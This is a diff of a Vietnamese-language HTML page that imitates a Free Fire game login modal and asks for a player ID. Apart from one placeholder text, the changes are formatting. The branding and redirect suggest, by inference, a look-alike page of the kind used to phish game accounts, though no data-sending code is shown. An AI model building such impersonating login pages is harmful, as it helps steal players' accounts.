@@ -1,6 +1,7 @@
 <!DOCTYPE html>
 <html>
 <meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
 <head>
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
@@ -32,6 +33,7 @@
     <link href="css/loginFreeFire.css" rel="stylesheet" />
     <script type="text/javascript" src="js/style.js"></script>
 </head>
+
 <body>
     <div class="s-header-1">
         <div class="container align-items--between">
@@ -78,15 +80,14 @@
             </div>
         </div>
     </div>
-    <div id="modalLogin2" class="c-modal c-modal-freefire" ht-close="c-modal" >
+    <div id="modalLogin2" class="c-modal c-modal-freefire" ht-close="c-modal">
         <div class="c-modal-box c-modal-box-freefire">
             <div id="loginForm" style="display:none" ht-skip="parent">
                 <div class="loginForm_container">
                     <div class="base_container">
                         <div class="base_detail_container">
                             <div class="btnClose" onclick="closeLogin()" ht-close="c-modal"></div>
-                            <img class="logo_freeFire"
-                                src="images/faifai.png">
+                            <img class="logo_freeFire" src="images/faifai.png">
                             <div class="freeFire_text_item">Free Fire</div>
                             <div class="text_login_with">Đăng nhập với</div>
                             <div class="plats_login">
@@ -100,7 +101,8 @@
                                     class="item_plats">
                             </div>
                             <div onclick="Idnguoichoi()" class="btn_change_popup xs-hidden">ID người chơi &gt;&gt;</div>
-                            <div onclick="Idnguoichoi2()" class="btn_change_popup lg-hidden">ID người chơi &gt;&gt;</div>
+                            <div onclick="Idnguoichoi2()" class="btn_change_popup lg-hidden">ID người chơi &gt;&gt;
+                            </div>
                         </div>
                     </div>
                 </div>
@@ -114,8 +116,10 @@
                                 <div class="titleFormWithId">ID đăng nhập<i class="iconId"></i>
                                 </div>
                                 <form class="detailFormWithId">
-                                    <div class="sectionField"><label for="playerId" class="labelField">ID người chơi</label>
-                                <input type="number" name="idfaifai" value="" placeholder="ID người chơi" class="inputField">
+                                    <div class="sectionField"><label for="playerId" class="labelField">ID người
+                                            chơi</label>
+                                        <input type="number" name="idfaifai" value="" placeholder="Hãy nhập UID của bạn"
+                                            class="inputField">
                                     </div>
                                     <button name="login" class="btnLogin" type="submit">Đăng nhập</button>
                                 </form>
@@ -169,7 +173,8 @@
                     </a>
                 </div>
                 <div class="col-6 col-sm-4">
-                    <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin2" class="b-card-1 faifai" onclick="openLogin()">
+                    <a href="javascript:;" ht-trigger="c-modal" ht-target="#modalLogin2" class="b-card-1 faifai"
+                        onclick="openLogin()">
                         <!-- LINK -->
                         <img src="images/faifai.png" alt="">
                         <h3>Free Fire</h3>
@@ -383,4 +388,5 @@
             window.location = "login.html";
         }
     </script>
+
 </html>
